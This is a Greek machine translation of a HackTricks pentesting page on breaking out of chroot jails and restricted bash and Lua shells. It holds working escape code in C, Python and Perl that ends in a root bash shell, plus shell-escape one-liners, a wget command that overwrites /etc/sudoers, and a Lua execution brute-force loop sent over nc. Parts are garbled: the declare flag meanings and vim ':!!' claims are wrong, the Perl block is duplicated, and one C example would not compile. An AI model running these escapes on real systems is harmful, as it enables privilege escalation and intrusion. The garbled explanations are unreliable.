# Απόδραση από τα Jails

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## **GTFOBins**

**Αναζητήστε στο** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **αν μπορείτε να εκτελέσετε οποιοδήποτε δυαδικό αρχείο με ιδιότητα "Shell"**

## Απόδραση από το Chroot

Από την [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Ο μηχανισμός chroot **δεν προορίζεται για να προστατεύει** από πρόθεσης παρεμβολή από **προνομιούχους** (**root**) **χρήστες**. Στις περισσότερες συστάσεις, οι περιβάλλοντα chroot δεν στοιβάζονται σωστά και τα προγράμματα που εκτελούνται μέσα σε ένα chroot με επαρκή δικαιώματα μπορούν να εκτελέσουν ένα δεύτερο chroot για να διαφύγουν.\
Συνήθως αυτό σημαίνει ότι για να διαφύγετε πρέπει να είστε root μέσα στο chroot.

{% hint style="success" %}
Το **εργαλείο** [**chw00t**](https://github.com/earthquake/chw00t) δημιουργήθηκε για να καταχραστεί τα παρακάτω σενάρια και να διαφύγει από το `chroot`.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
Εάν είστε **root** μέσα σε ένα chroot μπορείτε να **διαφύγετε** δημιουργώντας **ένα άλλο chroot**. Αυτό συμβαίνει επειδή δύο chroots δεν μπορούν να υπάρχουν ταυτόχρονα (στο Linux), οπότε αν δημιουργήσετε ένα φάκελο και στη συνέχεια **δημιουργήσετε ένα νέο chroot** σε αυτόν τον νέο φάκελο ενώ **είστε έξω από αυτόν**, τότε θα βρίσκεστε **έξω από το νέο chroot** και, συνεπώς, θα βρίσκεστε στο σύστημα αρχείων.

Αυτό συμβαίνει επειδή συνήθως το chroot ΔΕΝ μετακινεί τον τρέχοντα κατάλογο εργασίας στον καθορισμένο, οπότε μπορείτε να δημιουργήσετε ένα chroot αλλά να είστε έξω από αυτόν.
{% endhint %}

Συνήθως δεν θα βρείτε το δυαδικό αρχείο `chroot` μέσα σε ένα chroot jail, αλλά **μπορείτε να το μεταγλωττίσετε, να το ανεβάσετε και να το εκτελέσετε**:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Πυθώνας</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>

Η γλώσσα προγραμματισμού Perl είναι ιδανική για την απόδραση από περιορισμένα περιβάλλοντα bash. Μπορείτε να χρησιμοποιήσετε την εντολή `system` για να εκτελέσετε εντολές bash από το Perl script. Αυτό σας επιτρέπει να αποκτήσετε προνόμια υψηλότερου επιπέδου και να δραπετεύσετε από τον περιορισμένο bash shell.

Παρακάτω παρουσιάζεται ένα παράδειγμα Perl script που χρησιμοποιεί την εντολή `system` για να εκτελέσει μια εντολή bash:

```perl
#!/usr/bin/perl

system("/bin/bash -c 'command'");
```

Αντικαταστήστε τη λέξη "command" με την εντολή bash που θέλετε να εκτελέσετε. Όταν εκτελέσετε αυτό το Perl script, θα εκτελεστεί η εντολή bash και θα έχετε πρόσβαση σε προνόμια υψηλότερου επιπέδου.

</details>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Αποθηκευμένο fd

{% hint style="warning" %}
Αυτό είναι παρόμοιο με την προηγούμενη περίπτωση, αλλά σε αυτή την περίπτωση ο **επιτιθέμενος αποθηκεύει έναν αριθμό αναγνωριστικού αρχείου (file descriptor) στον τρέχοντα φάκελο** και στη συνέχεια **δημιουργεί το chroot σε ένα νέο φάκελο**. Τελικά, καθώς έχει **πρόσβαση** σε αυτόν τον **FD έξω από το chroot**, μπορεί να τον χρησιμοποιήσει για να **δραπετεύσει**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
Το FD μπορεί να περάσει μέσω Unix Domain Sockets, οπότε:

* Δημιουργήστε ένα διεργασία παιδί (fork)
* Δημιουργήστε UDS ώστε ο γονέας και το παιδί να μπορούν να επικοινωνούν
* Εκτελέστε το chroot στη διεργασία παιδί σε έναν διαφορετικό φάκελο
* Στη διεργασία γονέα, δημιουργήστε ένα FD ενός φακέλου που βρίσκεται έξω από το chroot της νέας διεργασίας παιδιού
* Περάστε στη διεργασία παιδί αυτό το FD χρησιμοποιώντας το UDS
* Η διεργασία παιδί αλλάζει τον τρέχοντα φάκελο σε αυτόν τον FD και επειδή βρίσκεται έξω από το chroot της, θα δραπετεύσει από τη φυλακή
{% endhint %}

### &#x20;Root + Mount

{% hint style="warning" %}
* Τοποθετήστε τη ρίζα της συσκευής (/) σε έναν κατάλογο μέσα στο chroot
* Εκτελέστε το chroot σε αυτόν τον κατάλογο

Αυτό είναι δυνατό στο Linux
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* Τοποθετήστε το procfs σε έναν κατάλογο μέσα στο chroot (αν δεν υπάρχει ήδη)
* Αναζητήστε ένα pid που έχει μια διαφορετική καταχώρηση root/cwd, όπως: /proc/1/root
* Εκτελέστε το chroot σε αυτήν την καταχώρηση
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* Δημιουργήστε ένα Fork (διεργασία παιδί) και εκτελέστε το chroot σε έναν διαφορετικό φάκελο πιο βαθιά στο σύστημα αρχείων και αλλάξτε τον τρέχοντα φάκελο σε αυτόν
* Από τη διεργασία γονέα, μετακινήστε τον φάκελο όπου βρίσκεται η διεργασία παιδί σε έναν φάκελο προηγούμενο του chroot των παιδιών
* Αυτή η διεργασία παιδί θα βρεθεί έξω από το chroot
{% endhint %}

### ptrace

{% hint style="warning" %}
* Παλαιότερα, οι χρήστες μπορούσαν να εντοπίζουν σφάλματα στις δικές τους διεργασίες από μια διεργασία του ίδιου τους... αλλά αυτό δεν είναι πλέον δυνατό από προεπιλογή
* Παρόλα αυτά, αν είναι δυνατό, μπορείτε να εντοπίσετε σφάλματα σε μια διεργασία και να εκτελέσετε ένα shellcode μέσα σε αυτήν ([δείτε αυτό το παράδειγμα](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## Φυλακές Bash

### Απαρίθμηση

Λάβετε πληροφορίες σχετικά με τη φυλακή:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Τροποποίηση του PATH

Ελέγξτε αν μπορείτε να τροποποιήσετε τη μεταβλητή περιβάλλοντος PATH.
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Χρήση του vim

Ο επεξεργαστής κειμένου vim είναι ένας ισχυρός επεξεργαστής κειμένου που μπορεί να χρησιμοποιηθεί για να εκτελέσετε ορισμένες ενέργειες προνομιούχου ανόδου. Ακολουθούν μερικές τεχνικές που μπορείτε να χρησιμοποιήσετε με το vim:

1. Εκτέλεση εντολών shell: Μπορείτε να εκτελέσετε εντολές shell από το vim χρησιμοποιώντας την εντολή `:!`. Για παράδειγμα, μπορείτε να εκτελέσετε την εντολή `:!id` για να εμφανίσετε την ταυτότητα του χρήστη που εκτελεί το vim.

2. Εκτέλεση εντολών με δικαιώματα ρίζας: Αν έχετε πρόσβαση στον λογαριασμό ρίζας, μπορείτε να εκτελέσετε εντολές με δικαιώματα ρίζας από το vim. Χρησιμοποιήστε την εντολή `:!!` για να εκτελέσετε την τελευταία εντολή με δικαιώματα ρίζας.

3. Εκτέλεση εντολών με τοπικά δικαιώματα χρήστη: Μπορείτε επίσης να εκτελέσετε εντολές με τα δικαιώματα του τρέχοντος χρήστη. Χρησιμοποιήστε την εντολή `:sh` για να ανοίξετε ένα νέο παράθυρο shell με τα δικαιώματα του τρέχοντος χρήστη.

Αυτές είναι μερικές από τις βασικές τεχνικές που μπορείτε να χρησιμοποιήσετε με το vim για να εκτελέσετε ενέργειες προνομιούχου ανόδου. Θυμηθείτε πάντα να χρησιμοποιείτε αυτές τις τεχνικές με προσοχή και μόνο όταν έχετε την απαραίτητη άδεια.
```bash
:set shell=/bin/sh
:shell
```
### Δημιουργία σεναρίου

Ελέγξτε αν μπορείτε να δημιουργήσετε ένα εκτελέσιμο αρχείο με περιεχόμενο _/bin/bash_.
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Πάρτε το bash από το SSH

Εάν έχετε πρόσβαση μέσω ssh, μπορείτε να χρησιμοποιήσετε αυτό το κόλπο για να εκτελέσετε ένα κέλυφος bash:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Δήλωση

Η δήλωση `declare` χρησιμοποιείται για να ορίσει μεταβλητές και να τους αναθέσει τιμές. Μπορεί επίσης να χρησιμοποιηθεί για να ορίσει τις ιδιότητες μιας μεταβλητής, όπως τον τύπο δεδομένων και την εμβέλειά της.

Η σύνταξη για τη δήλωση μιας μεταβλητής είναι η εξής:

```bash
declare [-aAfFgilnrtux] [-p] [name[=value]]
```

Οι επιλογές που μπορούν να χρησιμοποιηθούν με τη δήλωση `declare` περιλαμβάνουν:

- `-a`: Δηλώνει μια μεταβλητή ως πίνακα.
- `-A`: Δηλώνει μια μεταβλητή ως συσχετισμένο πίνακα.
- `-f`: Δηλώνει μια μεταβλητή ως συνάρτηση.
- `-F`: Δηλώνει μια μεταβλητή ως συνάρτηση που είναι προσβάσιμη μόνο για ανάγνωση.
- `-g`: Δηλώνει μια μεταβλητή ως παγκόσμια.
- `-i`: Δηλώνει μια μεταβλητή ως αναφορά σε μια μεταβλητή περιβάλλοντος.
- `-l`: Δηλώνει μια μεταβλητή ως τοπική.
- `-n`: Δηλώνει μια μεταβλητή ως αριθμητική.
- `-r`: Δηλώνει μια μεταβλητή ως μόνο για ανάγνωση.
- `-t`: Δηλώνει μια μεταβλητή ως πίνακα με αριθμητικές τιμές.
- `-u`: Δηλώνει μια μεταβλητή ως ανεπανάληπτη.
- `-x`: Δηλώνει μια μεταβλητή ως εξαγωγή για το περιβάλλον.

Μπορείτε επίσης να χρησιμοποιήσετε την επιλογή `-p` για να εμφανίσετε τις ιδιότητες μιας μεταβλητής.

Παραδείγματα:

```bash
declare -a my_array
declare -i my_number=10
declare -r readonly_var="This variable is read-only"
declare -x exported_var="This variable is exported"
declare -p my_array
```

Η παραπάνω δήλωση θα δημιουργήσει έναν πίνακα με το όνομα `my_array`, μια αριθμητική μεταβλητή με το όνομα `my_number` και τιμή 10, μια μεταβλητή μόνο για ανάγνωση με το όνομα `readonly_var` και μια εξαγόμενη μεταβλητή με το όνομα `exported_var`. Η επιλογή `-p` θα εμφανίσει τις ιδιότητες του πίνακα `my_array`.
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Μπορείτε να αντικαταστήσετε, για παράδειγμα, το αρχείο sudoers.
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Άλλα κόλπα

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells\*\*]\(https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io/\*\*]\(https/gtfobins.github.io)\
**Ενδιαφέρουσα μπορεί να είναι επίσης η σελίδα:**

{% content-ref url="../useful-linux-commands/bypass-bash-restrictions.md" %}
[bypass-bash-restrictions.md](../useful-linux-commands/bypass-bash-restrictions.md)
{% endcontent-ref %}

## Python Jails

Κόλπα για τη διαφυγή από τα python jails στην ακόλουθη σελίδα:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua Jails

Σε αυτήν τη σελίδα μπορείτε να βρείτε τις παγκόσμιες συναρτήσεις στις οποίες έχετε πρόσβαση μέσα στο lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Αξιολόγηση με εκτέλεση εντολής:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Μερικά κόλπα για να **καλέσετε συναρτήσεις ενός βιβλιοθηκών χωρίς να χρησιμοποιήσετε τελείες**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Απαριθμήστε τις λειτουργίες ενός βιβλιοθηκών:
```bash
for k,v in pairs(string) do print(k,v) end
```
Σημείωση ότι κάθε φορά που εκτελείτε την προηγούμενη μια γραμμή σε ένα **διαφορετικό περιβάλλον lua η σειρά των συναρτήσεων αλλάζει**. Επομένως, αν χρειάζεστε να εκτελέσετε μια συγκεκριμένη συνάρτηση, μπορείτε να πραγματοποιήσετε μια επίθεση με βία φορτώνοντας διάφορα περιβάλλοντα lua και καλώντας την πρώτη συνάρτηση της βιβλιοθήκης le:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Αποκτήστε διαδραστικό κέλυφος lua**: Εάν βρίσκεστε μέσα σε ένα περιορισμένο κέλυφος lua, μπορείτε να αποκτήσετε ένα νέο κέλυφος lua (και ελπίζουμε απεριόριστο) καλώντας:
```bash
debug.debug()
```
## Αναφορές

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Διαφάνειες: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
